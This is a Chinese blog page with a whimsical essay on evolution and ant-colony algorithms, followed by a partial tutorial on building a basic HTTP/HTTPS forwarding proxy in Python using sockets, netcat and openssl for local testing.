                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/Life/2014/02/18//#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="Life/2014/02/18//" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>Warning: 满篇的信口雌黄，请勿认真。</p>
<blockquote>
<p>温度计说，零下25度，天气预报说，北部寒潮，东部暴雨，南方大风，经验说，路面很滑，坡度表说，这太陡了，而你说，感谢这一切….</p>
</blockquote>
<p>从小就对生物感兴趣，好奇毫无生气的元素如何如何就造就了栩栩如生丰富多彩的世界。然而时光飞逝，渐渐来到这里，每日敲着代码。在森林中彷徨着，抬头看不到日月星辰，走起来分不清东南西北。</p>
<p>从家里离开的那天前一晚，看了CCTV记录频道一档励志片——人猿星球。讲述了两个人科动物的爱恨情仇，刀光剑影。</p>
<p>人高马大，身体健壮，皮肤白皙的尼安德特人灭绝了，这群高富帅属性符合多少女性审美趣味的原始人类永远消失在地球之上。矮搓穷们的非洲智人则取代他们，成为地球的主宰。</p>
<p>太他妈励志了。</p>
<p>励志片说智人发明了针，于是尼安德特人灭绝了。</p>
<p>励志片说智人产生了男女分工甚至社会分工，于是尼安德特人灭绝了。</p>
<p>励志片说智人更容易说话，于是尼安德特人灭绝了。</p>
<p>励志片说尼安德特人需要的食物更多，于是他们灭绝了。</p>
<p>智人们说，团结就是力量，于是尼安德特人灭绝了。</p>
<p>其实总结起来就是，社会化的智人在这个星球上有更强大的生存能力。所以，有了现在的我们。</p>
<p>又想起了另一档励志片。叫做《远古生物大灭绝》，我看的那集讲了主宰地球两亿年的恐龙如何被一颗飞来横祸的小行星给祸害的故事。也是一群地下穴居哺乳动物如何逆袭成为世界主流的故事。</p>
<p>一颗小行星，一个偶发事件，改变了生物生存的环境，也因此改变了进化的轨迹。生物有多脆弱，再强大的生物在自然的变化前也难逃厄运。</p>
<p>小行星撞击地球对哺乳动物是个机遇。从前作为恐龙的食物他们被迫转入地下，存储食物。结果，虽然死亡率很高，它们没有灭绝。在黎明前的黑暗之后，便迎来了哺乳动物的时代。</p>
<p>想想启示吧，生存下来是第一要务，人应该锻炼更有利于生存的技能，否则在社会竞争下等待的只有被选择淘汰的命运。</p>
<p>困难的时候就等等机遇吧，等个两亿年说不定世界就变了。世界变了，习惯困难的倒霉孩子也会很倒霉，但有些人会更倒霉。</p>
<p>这时候不得不说说我最爱看的电视节目：动物世界</p>
<p>管他是什么动物，看着生物们使出浑身解数，各施绝技，你就感觉这世界太他妈精彩了，可能性太他妈多了。好像忽然明白生命不只是只有一条路而是存在无数可能。</p>
<p>我从前一直觉得捕食者好像很舒服似的，被捕食者真是倒了霉的。后来才知道捕食者的日子也难过的一比。一次捕食失败就会沉重打击一个捕食者，也许它就此被淘汰出局。食物链越上层的动物越是脆弱，因为它越是依赖下层的支持和供应。嗯，懂我在说什么吧。</p>
<p>生命就像场游戏，你不会见到比这更迷人更丰富的游戏了。你不得不玩这个游戏。</p>
<p>没倒下就坚持到最后。</p>
<p>最后谈谈正题，谈谈蚂蚁。</p>
<p>我所崇拜的黑客、物理学家、无线电修理者、保险柜密码破解高手、艺术家、舞蹈爱好者、手鼓演奏者和玛雅象形文字的破译者费曼曾经在他的书中描述过某个的午后，他是怎么和蚂蚁有个约会玩的上了瘾。费曼探索出蚂蚁找寻食物的原理，它们通过信息素/气味进行通信，标识食物和窝的路径。</p>
<p>1992年，著名的蚁群算法诞生了。</p>
<p>我第一次看到“蚁群算法”是在江南大学的图书馆里某本书，立即被这个神奇的过程吸引了，然而想起来动手试试，竟然是多少年之后的事。</p>
<p>更奇葩的是，竟然照着百度百科来的……</p>
<p>蚂蚁很萌的，你们不要黑它。</p>
<p>它们的世界很小，身边<code>3x3</code>的世界，它们只是蚁群蚂蚁中微不足道的一部分。</p>
<p>蚂蚁说，我从何处来，将往哪里去呢？</p>
<p>蚂蚁们有两个状态，有的寻找食物，有的寻找蚂蚁洞。</p>
<p>可怜的蚂蚁。</p>
<p>但是它们竟然找到一条近乎最短的到食物的路径，来回往复，How？</p>
<p>我抓了一只萌蚂蚁问她</p>
<p>蚂蚁说，我们通过气味来交流</p>
<p>蚂蚁说，当我发现食物时，就开始留下气味，离食物越远，我留下的气味越小。</p>
<p>蚂蚁说, 随着时间流逝，我留下的气味慢慢挥发。</p>
<p>蚂蚁说，我这样做决定：</p>
<ol>
<li>如果我的四周哪个地方信息素越高，那里有我寻找的东西的几率就大，我就往哪里去。</li>
<li>但是我不走回头路，我会记住曾走过的一部分路，并且尽量避免再走一遍</li>
<li>蚂蚁说，当我找到什么时我就回头寻找回去的路。</li>
</ol>
<p>于是我放了一些食物和一群蚂蚁，看看它们能不能找到窝，我想它们可以找到。</p>
<p>虽然一个只能朝八个方向运动的蚂蚁是这么不完美, 最短路径也是这么不完美。</p>
<p>but, it works…</p>
<p>我得找个地方放视频。干脆用gimp转成gif算了……不知道matplotlib能不能做这个……懒得看了</p>
<p><img src="/images/ants/animate.gif" alt="蚁群算法模拟"></p>
<p>made by matplotlib</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/python/2014/01/29/python/" itemprop="url">
                  用python写一个http代(和谐)理
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2014-01-29T00:00:00+08:00" content="2014-01-29">
              2014-01-29
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/python/2014/01/29/python/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="python/2014/01/29/python/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>简单展示和学习，清晰为主，不考虑效率。</p>
<p>本文简单讨论支持GET/CONNECT方法的http代理。这两种可能是最常用的方法。GET请求用于大多数http请求，CONNECT请求负责处理https。</p>
<p>为了更加明晰，也没有使用requests或者httplib等其它模块，没有使用SocketServer和它的子类，因为我个人觉得从socket开始能有个更加清晰的理解。</p>
<p>看着玩吧。</p>
<p>如果真的要用一个Proxy，我会直接使用pytho中的twisted或者BaseHTTPServer，或者基于nodejs的。它们有着更好的设计和更高层次的抽象，当然，更全面的特性和更稳定、更高的性能。文末将给出相关资料与实现。</p>
<p>请准备好一台linux系统，安装好netcat, openssl和python解释器。目前我用的还是2.7。</p>
<h2 id="基本原理">基本原理</h2><h3 id="客户服务器模型">客户服务器模型</h3><p>首要问题是：客户服务器之间如何通信。简单说来就是客户端发送请求，告诉服务器我要什么东西，服务器则告诉客户端想要的东西或者告诉客户端找不到。</p>
<p>首先，客户端比如你的浏览器要找到服务器，通常的做法是在浏览器地址栏输入你想寻找的服务器。至于怎么寻找，如何最后在你的客户端和服务器间建立连接这点不细说。总之最后的结果是，两者之间建立了一条可以互相通话的专有线路，就像两个打电话的人一样，电话已经接通。</p>
<p>接着，你的浏览器说，我想要什么什么东西，有什么什么要求。电话另一头的服务器听到后就回复它有没有什么东西，如果有返回个什么样的东西，然后把东西传给你的浏览器。</p>
<p>接受到从服务器传来的数据后，浏览器把一堆你看不懂的东西绘制到屏幕上，绘声绘色地显示给你。</p>
<p>就这么简单。详情请参考RFC 2616，这是第一手最好的资料。</p>
<p>下面让我么实际看看他们都怎么通话的</p>
<p>我们先看看不用代理时，浏览器向服务器发送了些什么。监听本地8888端口</p>
<pre><code> ~ ⮀ nc -lvp <span class="number">8888</span>
listening on [any] <span class="number">8888</span> ...
connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] from localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">56499</span>
GET /index.html?haha=<span class="number">1</span>&amp;papa=<span class="number">2</span> HTTP/<span class="number">1.1</span> Host: localhost:<span class="number">8888</span> User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">24.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">24.0</span>
Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie:  __utma=<span class="label">XXXXXXXXXXXXXXXXXXXXXXXXXx; __utmz=111x7x2x1.13x86x7x41.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)</span>
Connection: keep-alive</span>
</code></pre><p>忽略无关紧要的细节，这就是传说中的HTTP头。注意，最后还得有个空行表示我说完了。它告诉服务器以下一些信息：</p>
<ul>
<li>浏览器想做什么(<code>GET</code>)</li>
<li>想要什么(<code>index.html?haha=1&amp;papa=2</code>)</li>
<li>说的什么版本的什么话(<code>HTTP/1.1</code>)</li>
<li>要的东西在哪里(<code>Host</code>)</li>
<li>浏览器的一些特征(<code>User-Agent:</code>)</li>
<li>浏览器接收什么样的东西(<code>Accept</code>)</li>
<li>浏览器可以接受什么样的人类语言(<code>Accept-Language</code>)</li>
<li>浏览器能处理的压缩或编码方式(<code>Accept-Encoding</code>)</li>
<li>其它信息(标识浏览器身份的<code>Cookie</code>和在通话完成后是否把电话挂掉的信息<code>Connection</code>)</li>
</ul>
<p>对于特定版本的HTTP协议1.1，除了前两行是必要的其它都是可选的。</p>
<p>我们再看看服务器返回的信息是啥样的。</p>
<pre><code> ~ ⮀ nc baidu.com 80
GET / HTTP/1.1
Host: baidu.com

HTTP/1.1 200 OK
Date: Mon, 03 Feb 2014 07:37:46 GMT
Server: Apache
<span class="operator"><span class="keyword">Cache</span>-Control: <span class="keyword">max</span>-age=<span class="number">86400</span>
Expires: Tue, <span class="number">04</span> Feb <span class="number">2014</span> <span class="number">07</span>:<span class="number">37</span>:<span class="number">46</span> GMT
<span class="keyword">Last</span>-Modified: Tue, <span class="number">12</span> Jan <span class="number">2010</span> <span class="number">13</span>:<span class="number">48</span>:<span class="number">00</span> GMT
ETag: <span class="string">"51-4b4c7d90"</span>
<span class="keyword">Accept</span>-Ranges: <span class="keyword">bytes</span>
<span class="keyword">Content</span>-<span class="keyword">Length</span>: <span class="number">81</span>
<span class="keyword">Connection</span>: <span class="keyword">Keep</span>-Alive
<span class="keyword">Content</span>-<span class="keyword">Type</span>: <span class="built_in">text</span>/html

&lt;html&gt;
&lt;meta <span class="keyword">http</span>-equiv=<span class="string">"refresh"</span> <span class="keyword">content</span>=<span class="string">"0;url=http://www.baidu.com/"</span>&gt;
&lt;/html&gt;</span>
</code></pre><p>服务器返回了这些信息：</p>
<ul>
<li>服务器端用什么版本的什么话通信(<code>HTTP/1.1</code>)</li>
<li>浏览器请求的资源是否可获得(<code>200 OK</code>)</li>
<li>还有其它细节用来表示时间，它的情况，浏览器应该怎么做，传送的消息是什么等等。</li>
</ul>
<p>这就是传说中的HTTP响应头。一个空行之后是实际传送的数据。嗯，这里就是浏览器喜欢的html文本文件。浏览器接收后会将其解析渲染或执行对应操作。</p>
<p>嗯基本原理就是这样。</p>
<h2 id="连接的建立">连接的建立</h2><p>当我们谈互联网时，不得不说说什么是socket。</p>
<p>当然，还得知道互联网的分层架构。</p>
<p>然而暂时不要管什么是socket，反正它就存在在那里，整个互联网建立在socket通信之上，包括Unix系统的内部通信。</p>
<p>可以把它设想成一个通信管道或线路的入口。如何使用它呢？拿python示例：</p>
<pre><code>import <span class="built_in">socket</span>
soc = <span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET, <span class="built_in">socket</span>.SOCK_STREAM)
</code></pre><p>我们先导入socket模块，然后建立了一种指定类型的socket，嗯，这里是支持IPv4上TCP连接的socket。</p>
<p>一个服务器应该这样，要先绑定，然后监听：</p>
<pre><code>soc.<span class="function"><span class="title">bind</span><span class="params">(<span class="string">""</span>, <span class="number">8888</span>)</span></span>
new_soc, <span class="tag">address</span> = soc.<span class="function"><span class="title">accept</span><span class="params">()</span></span>
new_soc.<span class="function"><span class="title">recv</span><span class="params">(<span class="number">1024</span>)</span></span>
</code></pre><p>以上将socket绑定到本地(<code>&quot;&quot;</code>)的8888端口。这样，所有连接到本机8888端口的连接实际上都是通过这个socket连接了。</p>
<p>接着，开始监听，一旦有客户端连接本机8888端口，就返回它的地址(address)和一个新的socket。注意，服务器端socket并不进行通信，只监听连接并生成一个新的用来连接的socket。然后，可以通过这个新的socket和客户端通信。</p>
<p>客户端则比较简单：</p>
<pre><code>soc.connect(localhost, <span class="number">8888</span>)
soc.send(<span class="string">"<span class="keyword">GET</span> / HTTP/1.1\r\nHost: baidu.com\r\n\r\n"</span>)
</code></pre><p>连接某个机器的某个端口后则可以通过socket进行通信</p>
<h3 id="代理服务器">代理服务器</h3><p>代理服务器，是服务器和客户端之间一个中间站。将客户端发送的请求转发给服务器，将服务器的响应转发给客户端。</p>
<p>当我们说到代理服务器，首先它是一个服务器。</p>
<p>有了上面的基础可以写出以下代码，更多细节参考Python的socket文档：</p>
<pre><code>import <span class="keyword">socket</span>
soc.<span class="keyword">bind</span>(<span class="string">""</span>, <span class="number">8888</span>)
<span class="keyword">while</span> True:
    <span class="comment"># 监听接入的连接</span>
    new_soc, address = soc.<span class="keyword">accept</span>()
    <span class="comment"># 从socket读取数据</span>
    data = new_soc.<span class="keyword">recv</span>(<span class="number">1024</span>)
    <span class="comment"># 向socket发送数据</span>
    new_soc.<span class="keyword">send</span>(data)
</code></pre><p>其次它是一个客户端，它要向服务器请求数据。</p>
<p>其次它是个web服务器，尽管它大部分数据只需要转发。但它应该能处理HTTP协议，只是不必什么都处理。下面将展示有哪些地方在转发时必须处理。</p>
<h3 id="火狐在使用代理时的HTTP头">火狐在使用代理时的HTTP头</h3><p>与不使用代理时有什么不同呢？</p>
<pre><code>~ ⮀ nc -lvp <span class="number">8000</span>
listening on [any] <span class="number">8000</span> ...
connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] from localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">60601</span>
GET http:<span class="comment">//baidu.com/ HTTP/1.1</span>
Host: baidu.com
User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">24.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">24.0</span>
Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: BAIDUID=×××××××××××××××:FG=1; BDUSS=<span class="label">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; bid_1=XXXXXXXXXXXXXXXXXXX; MCITY=-XXXXXXXXX%3A</span>
Connection: keep-alive</span>
</code></pre><p>注意没，GET后面不是请求的文件的路径，而是整个URI。那么我们的代理服务器得把浏览器的请求改成路径再转发。</p>
<p>其次，我们不希望再转发给baidu.com的服务器之后服务器不断开连接而一直保持，我们希望它赶紧断开连接好让我们能干点其它事。</p>
<pre><code><span class="attribute">Connection</span>: <span class="string">close</span>
</code></pre><p>综上，一个简单的能处理GET请求的代理服务器应该能做到：</p>
<ul>
<li>将浏览器请求的第一行中完整的URL(<a href="http://baidu.com/)替换成路径(&#39;/&#39;)，通常情况下，没有指定资源文件的情况下默认是`/index.html`。" target="_blank" rel="external">http://baidu.com/)替换成路径(&#39;/&#39;)，通常情况下，没有指定资源文件的情况下默认是`/index.html`。</a></li>
<li>将HTTP头中的Connection设置为close。</li>
</ul>
<p>基本原理就是这样，嗯，多简单。</p>
<h2 id="实现代(和谐)理">实现代(和谐)理</h2><p>我们可以先写点什么验证我们的想法，</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>
<span class="comment"># -*- coding: utf-8 -*-</span>

<span class="keyword">import</span> socket
<span class="keyword">import</span> urlparse

HOST = <span class="string">''</span>                 <span class="comment"># Symbolic name meaning all available interfaces</span>
PORT = <span class="number">8000</span>              <span class="comment"># Arbitrary non-privileged port</span>


<span class="function"><span class="keyword">def</span> <span class="title">server</span><span class="params">(host, port)</span>:</span>
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)
    s.bind((host, port))
    s.listen(<span class="number">500</span>)
    <span class="keyword">print</span> <span class="string">"Serving at %s"</span> % PORT
    <span class="keyword">while</span> <span class="number">1</span>:
        <span class="keyword">try</span>:
            conn, addr = s.accept()
            handle_connection(conn)
        <span class="keyword">except</span> KeyboardInterrupt:
            <span class="keyword">print</span> <span class="string">"Bye..."</span>
            <span class="keyword">break</span>


<span class="function"><span class="keyword">def</span> <span class="title">getline</span><span class="params">(conn)</span>:</span>
    line = <span class="string">''</span>
    <span class="keyword">while</span> <span class="number">1</span>:
        buf = conn.recv(<span class="number">1</span>)
        <span class="keyword">if</span> buf == <span class="string">'\r'</span>:
            line += buf
            buf = conn.recv(<span class="number">1</span>)
            <span class="keyword">if</span> buf == <span class="string">'\n'</span>:
                line += buf
                <span class="keyword">return</span> line
        <span class="comment"># elif buf == '':</span>
        <span class="comment">#     return</span>
        <span class="keyword">else</span>:
            line += buf


<span class="function"><span class="keyword">def</span> <span class="title">get_header</span><span class="params">(conn)</span>:</span>
    <span class="string">'''
    不包括\r\n
    '''</span>
    headers = <span class="string">''</span>
    <span class="keyword">while</span> <span class="number">1</span>:
        line = getline(conn)
        <span class="keyword">if</span> line <span class="keyword">is</span> <span class="keyword">None</span>:
            <span class="keyword">break</span>
        <span class="keyword">if</span> line == <span class="string">'\r\n'</span>:
            <span class="keyword">break</span>
        <span class="keyword">else</span>:
            headers += line
    <span class="keyword">return</span> headers


<span class="function"><span class="keyword">def</span> <span class="title">parse_header</span><span class="params">(raw_headers)</span>:</span>
    request_lines = raw_headers.split(<span class="string">'\r\n'</span>)
    first_line = request_lines[<span class="number">0</span>].split(<span class="string">' '</span>)
    method = first_line[<span class="number">0</span>]
    full_path = first_line[<span class="number">1</span>]
    version = first_line[<span class="number">2</span>]
    <span class="keyword">print</span> <span class="string">"%s %s"</span> % (method, full_path)
    (scm, netloc, path, params, query, fragment) \
        = urlparse.urlparse(full_path, <span class="string">'http'</span>)
    <span class="comment"># 如果url中有‘：’就指定端口，没有则为默认80端口</span>
    i = netloc.find(<span class="string">':'</span>)
    <span class="keyword">if</span> i &gt;= <span class="number">0</span>:
        address = netloc[:i], int(netloc[i + <span class="number">1</span>:])
    <span class="keyword">else</span>:
        address = netloc, <span class="number">80</span>
    <span class="keyword">return</span> method, version, scm, address, path, params, query, fragment


<span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(conn)</span>:</span>
    <span class="comment"># 从socket读取头</span>
    req_headers = get_header(conn)
    <span class="comment"># 更改HTTP头</span>
    <span class="comment">## 要没有HTTP头的话。。。</span>
    <span class="keyword">if</span> req_headers <span class="keyword">is</span> <span class="keyword">None</span>:
        <span class="keyword">return</span>
    method, version, scm, address, path, params, query, fragment = \
        parse_header(req_headers)
    path = urlparse.urlunparse((<span class="string">""</span>, <span class="string">""</span>, path, params, query, <span class="string">""</span>))
    req_headers = <span class="string">" "</span>.join([method, path, version]) + <span class="string">"\r\n"</span> +\
        <span class="string">"\r\n"</span>.join(req_headers.split(<span class="string">'\r\n'</span>)[<span class="number">1</span>:])
    <span class="comment"># 建立socket用以连接URL指定的机器</span>
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="comment"># soc.settimeout(1)</span>
    <span class="comment"># 尝试连接</span>
    <span class="keyword">try</span>:
        soc.connect(address)
    <span class="keyword">except</span> socket.error, arg:
        conn.sendall(<span class="string">"HTTP/1.1"</span> + str(arg[<span class="number">0</span>]) + <span class="string">" Fail\r\n\r\n"</span>)
        conn.close()
        soc.close()
    <span class="keyword">else</span>:  <span class="comment"># 若连接成功</span>
        <span class="comment"># 把HTTP头中连接设置为中断</span>
        <span class="comment"># 如果不想让火狐卡在那里不继续加载的话</span>
        <span class="keyword">if</span> req_headers.find(<span class="string">'Connection'</span>) &gt;= <span class="number">0</span>:
            req_headers = req_headers.replace(<span class="string">'keep-alive'</span>, <span class="string">'close'</span>)
        <span class="keyword">else</span>:
            req_headers += req_headers + <span class="string">'Connection: close\r\n'</span>
        <span class="comment"># 发送形如`GET path/params/query HTTP/1.1`</span>
        <span class="comment"># 结束HTTP头</span>
        req_headers += <span class="string">'\r\n'</span>
        soc.sendall(req_headers)
        <span class="comment"># 发送完毕, 接下来从soc读取服务器的回复</span>
        <span class="comment"># 建立个缓冲区</span>
        data = <span class="string">''</span>
        <span class="keyword">while</span> <span class="number">1</span>:
            <span class="keyword">try</span>:
                buf = soc.recv(<span class="number">8129</span>)
                data += buf
            <span class="keyword">except</span>:
                buf = <span class="keyword">None</span>
            <span class="keyword">finally</span>:
                <span class="keyword">if</span> <span class="keyword">not</span> buf:
                    soc.close()
                    <span class="keyword">break</span>
        <span class="comment"># 转发给客户端</span>
        conn.sendall(data)
        conn.close()
<span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:
    server(HOST, PORT)
</code></pre><p>运行它并且将浏览器设置为使用该代理：</p>
<pre><code><span class="keyword">python</span> socket-proxy.<span class="keyword">py</span>
</code></pre><p>在本地建立一个web服务器实验：</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/proxy/</span>base_python ⮀ python -m SimpleHTTPServer <span class="number">8888</span> 
</code></pre><p>在浏览器中访问<code>http://localhost:8888</code>,成功列出当前目录。</p>
<p>你可以直接访问任何网站看看。渐渐会发现，我们的代理服务器虽然运行基本良好，一次却只能接受一个请求？非常低效。程序经常会阻塞在socket的读写上。</p>
<p>目前来说，提高效率有三种途径：</p>
<ul>
<li>异步I/O</li>
<li>线程</li>
<li>进程</li>
</ul>
<p>然而，本文暂不讨论如何提高效率。也许下回或某天会专门说说。我们接着再谈谈CONNECT代理实现原理。</p>
<h2 id="可进行https连接的http代理">可进行https连接的http代理</h2><p>https是建立在SSL/TLS上的安全连接，不要在意它是什么，我们只谈及它做什么。</p>
<p>通过SSL/TLS建立点与点之间的连接不被窃听。我们要为https连接代理的话，代理服务器就只能帮助客户端和服务器建立一条安全的加密通道，然后仅仅将数据中转。由于是加密的数据流，代理服务器并不能理解是什么，只看到一堆加密后的字符。</p>
<p>HTTP协议规定了一种CONNECT方法，用来向服务器申请这种中转。具体过程我们可以自己试着访问<code>https://google.com</code>看看，首先将浏览器代理设置为本地8000端口:</p>
<pre><code>~ ⮀ nc -lvp <span class="number">8000</span>
listening on [any] <span class="number">8000</span> ...
connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] from localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">43263</span>
CONNECT google.com:<span class="number">443</span> HTTP/<span class="number">1.1</span>
User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">24.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">24.0</span>
Proxy-Connection: keep-alive
Connection: keep-alive
Host: google.com

<span class="number">200</span> OK
��R����^��<span class="number">4</span>G��&gt;�&lt;�N�R���D1kVg|X�lH��
���<span class="number">98</span>���<span class="number">5</span>�      ���ED32��
���                      ���A/��
-
google.com
▒
 <span class="preprocessor">#<span class="number">3</span>t</span>
</code></pre><p>我们可以看到</p>
<ul>
<li>客户端向代理服务器申请代理(<code>CONNECT google.com:443 HTTP/1.1</code>)</li>
<li>代理服务器向客户端应答表示可以代理(<code>200 OK</code>)</li>
<li>客户端开始发送数据，准备建立加密信道</li>
</ul>
<p>剩下的工作应该由代理服务器继续。</p>
<ul>
<li>代理服务器建立一条与服务器的socket连接，</li>
<li>代理服务器在服务器和客户端之间转发数据。</li>
</ul>
<p>我们简单更改之前的简单脚本使之支持CONNECT（毫无设计的脚本风格写法……见笑）：</p>
<pre><code><span class="function"><span class="keyword">def</span> <span class="title">handle_connection</span><span class="params">(conn)</span>:</span>
    <span class="comment"># 从socket读取头</span>
    req_headers = get_header(conn)
    <span class="comment"># 更改HTTP头</span>
    <span class="comment">## 要没有HTTP头的话。。。</span>
    <span class="keyword">if</span> req_headers <span class="keyword">is</span> <span class="keyword">None</span>:
        <span class="keyword">return</span>
    method, version, scm, address, path, params, query, fragment = \
        parse_header(req_headers)
    <span class="keyword">if</span> method == <span class="string">'GET'</span>:
        do_GET(conn,
               req_headers,
               address,
               path,
               params,
               query,
               method,
               version)
    <span class="keyword">elif</span> method == <span class="string">'CONNECT'</span>:
        <span class="comment"># 注意</span>
        address = (path.split(<span class="string">':'</span>)[<span class="number">0</span>], int(path.split(<span class="string">':'</span>)[<span class="number">1</span>]))
        do_CONNECT(conn,
                   req_headers,
                   address)


<span class="function"><span class="keyword">def</span> <span class="title">do_CONNECT</span><span class="params">(conn, req_headers, address)</span>:</span>
    <span class="comment"># 建立socket用以连接URL指定的机器</span>
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="comment"># soc.settimeout(4)</span>
    <span class="comment"># 尝试连接</span>
    <span class="keyword">try</span>:
        soc.connect(address)
    <span class="keyword">except</span> socket.error, arg:
        conn.sendall(<span class="string">"/1.1"</span> + str(arg[<span class="number">0</span>]) + <span class="string">" Fail\r\n\r\n"</span>)
        conn.close()
        soc.close()
    <span class="keyword">else</span>:  <span class="comment"># 若连接成功</span>
        conn.sendall(<span class="string">'HTTP/1.1 200 Connection established\r\n\r\n'</span>)
        <span class="comment"># 数据缓冲区</span>
        <span class="comment"># 读取浏览器给出的消息</span>
        <span class="keyword">try</span>:
            <span class="keyword">while</span> <span class="keyword">True</span>:
                <span class="comment"># 从客户端读取数据，并转发给conn</span>
                data = conn.recv(<span class="number">99999</span>)
                soc.sendall(data)
                <span class="comment"># 从服务器读取回复，转发回客户端</span>
                data = soc.recv(<span class="number">999999</span>)
                conn.sendall(data)
        <span class="keyword">except</span>:
            conn.close()
            soc.close()


<span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(conn, req_headers, address, path, params, query, method, version)</span>:</span>
    path = urlparse.urlunparse((<span class="string">""</span>, <span class="string">""</span>, path, params, query, <span class="string">""</span>))
    req_headers = <span class="string">" "</span>.join([method, path, version]) + <span class="string">"\r\n"</span> +\
        <span class="string">"\r\n"</span>.join(req_headers.split(<span class="string">'\r\n'</span>)[<span class="number">1</span>:])
    <span class="comment"># 建立socket用以连接URL指定的机器</span>
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    <span class="comment"># soc.settimeout(1)</span>
    <span class="comment"># 尝试连接</span>
    <span class="keyword">try</span>:
        soc.connect(address)
    <span class="keyword">except</span> socket.error, arg:
        conn.sendall(<span class="string">"HTTP/1.1"</span> + str(arg[<span class="number">0</span>]) + <span class="string">" Fail\r\n\r\n"</span>)
        conn.close()
        soc.close()
    <span class="keyword">else</span>:  <span class="comment"># 若连接成功</span>
        <span class="comment"># 把HTTP头中连接设置为中断</span>
        <span class="comment"># 如果不想让火狐卡在那里不继续加载的话</span>
        <span class="keyword">if</span> req_headers.find(<span class="string">'Connection'</span>) &gt;= <span class="number">0</span>:
            req_headers = req_headers.replace(<span class="string">'keep-alive'</span>, <span class="string">'close'</span>)
        <span class="keyword">else</span>:
            req_headers += req_headers + <span class="string">'Connection: close\r\n'</span>
        <span class="comment"># 发送形如`GET path/params/query HTTP/1.1`</span>
        <span class="comment"># 结束HTTP头</span>
        req_headers += <span class="string">'\r\n'</span>
        soc.sendall(req_headers)
        <span class="comment"># 发送完毕, 接下来从soc读取服务器的回复</span>
        <span class="comment"># 建立个缓冲区</span>
        data = <span class="string">''</span>
        <span class="keyword">while</span> <span class="number">1</span>:
            <span class="keyword">try</span>:
                buf = soc.recv(<span class="number">8129</span>)
                data += buf
            <span class="keyword">except</span>:
                buf = <span class="keyword">None</span>
            <span class="keyword">finally</span>:
                <span class="keyword">if</span> <span class="keyword">not</span> buf:
                    soc.close()
                    <span class="keyword">break</span>
        <span class="comment"># 转发给客户端</span>
        conn.sendall(data)
        conn.close()
</code></pre><p>在终端运行代理：</p>
<pre><code><span class="keyword">python</span> socket-proxy.<span class="keyword">py</span>
</code></pre><p>紧接着我们用openssl搭建一个简单的测试用https服务器。</p>
<p>首先生成私钥：</p>
<pre><code> ~/Work/project/proxy/base_python ⮀ openssl genrsa <span class="attribute">-out</span> privkey<span class="built_in">.</span>pem <span class="number">1024</span>    
Generating RSA <span class="keyword">private</span> key, <span class="number">1024</span> bit long modulus
<span class="built_in">..</span>++++++
<span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">..</span>++++++
e is <span class="number">65537</span> (<span class="number">0x10001</span>)
</code></pre><p>生成一个未签名的证书：</p>
